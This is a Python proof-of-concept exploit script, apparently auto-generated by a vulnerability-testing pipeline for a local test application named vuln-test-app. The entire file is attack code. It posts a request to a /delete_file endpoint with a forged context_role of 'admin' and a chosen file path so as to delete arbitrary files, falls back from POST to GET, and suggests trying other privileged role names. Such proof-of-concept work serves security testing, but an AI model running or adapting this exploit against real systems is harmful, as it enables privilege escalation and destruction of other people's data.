#!/usr/bin/env python3
# PoC for vuln-test-app (/tmp/vuln-test-app)
# Path: afo-000
# Sink: delete_file
# Auto-generated — run with: python3 afo_filepath_shown_but_likely_delete_file_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for AFO (Arbitrary File Overwrite/Deletion) in vuln-test-app.

Vulnerability: The delete_file function uses a context_role parameter that overrides
the instance role, allowing privilege escalation. An attacker can pass
context_role='admin' and a controlled filepath to delete arbitrary files.

Usage:
    python3 exploit.py [--target http://localhost:5000] [--file /tmp/poc_success.txt]
"""

import argparse
import requests
import sys
import os

def exploit(target_url, filepath):
    """
    Attempt to delete an arbitrary file by exploiting the context_role override.
    
    Args:
        target_url: Base URL of the vulnerable application
        filepath: Path to the file to delete (must be writable by the app)
    """
    # The vulnerable endpoint - adjust if different
    endpoint = f"{target_url.rstrip('/')}/delete_file"
    
    # Craft the payload with context_role='admin' to bypass permission checks
    payload = {
        "filepath": filepath,
        "context_role": "admin"  # Override the instance role to admin
    }
    
    print(f"[*] Targeting: {endpoint}")
    print(f"[*] Attempting to delete: {filepath}")
    print(f"[*] Using context_role override: admin")
    
    try:
        # Send the request - method may be POST or GET depending on implementation
        # Try POST first (most common for state-changing operations)
        response = requests.post(endpoint, json=payload, timeout=10)
        
        # If POST fails with 405, try GET with query parameters
        if response.status_code == 405:
            print("[*] POST not allowed, trying GET...")
            response = requests.get(endpoint, params=payload, timeout=10)
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[+] SUCCESS: File deletion likely succeeded!")
            print(f"[+] Check if {filepath} was removed.")
            return True
        elif response.status_code == 403:
            print("[-] Permission denied - role override may not have worked.")
            print("[-] Try different role values: 'admin', 'root', 'superuser'")
        elif response.status_code == 404:
            print("[-] Endpoint not found - check the target URL and path.")
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed: {target_url}")
        print("[-] Is the target application running?")
    except requests.exceptions.Timeout:
        print("[-] Request timed out - target may be slow or unreachable.")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for AFO in vuln-test-app - delete arbitrary files via role override"
    )
    parser.add_argument(
        "--target", 
        default="http://localhost:5000",
        help="Target URL (default: http://localhost:5000)"
    )
    parser.add_argument(
        "--file",
        default="/tmp/poc_success.txt",
        help="File to delete (default: /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--create-test-file",
        action="store_true",
        help="Create a benign test file before attempting deletion"
    )
    
    args = parser.parse_args()
    
    # Optionally create a test file to demonstrate deletion
    if args.create_test_file:
        test_file = args.file
        try:
            with open(test_file, 'w') as f:
                f.write("This is a test file for PoC.")
            print(f"[*] Created test file: {test_file}")
        except Exception as e:
            print(f"[-] Could not create test file: {e}")
            sys.exit(1)
    
    # Run the exploit
    success = exploit(args.target, args.file)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] The vulnerability is confirmed - arbitrary file deletion is possible.")
    else:
        print("\n[-] Exploit did not succeed.")
        print("[-] Check if the target is running and the endpoint is correct.")
        sys.exit(1)

if __name__ == "__main__":
    main()
